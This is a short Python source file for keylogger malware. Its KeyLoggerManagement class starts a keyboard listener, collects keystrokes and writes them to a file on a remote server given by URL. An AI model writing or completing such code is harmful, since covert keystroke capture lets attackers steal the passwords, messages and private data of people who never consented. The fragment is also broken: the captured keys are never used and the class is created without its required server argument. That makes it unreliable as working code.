from Keyboard import KeyBoard
from WritingToTheServer import WritingToTheServer


class KeyLoggerManagement:
    def __init__(self,server_url):
        self.keyBoard = KeyBoard()
        self.write = WritingToTheServer(server_url)

    def management(self):
        self.keyBoard.start_listening()
        keys = self.keyBoard.get_listen_keys()

        self.write.create_file()


    def to_string(self,key):
        key = [" " if key == 'space' else k for k in key]
        key = "".join(key)
        return key


h = KeyLoggerManagement()




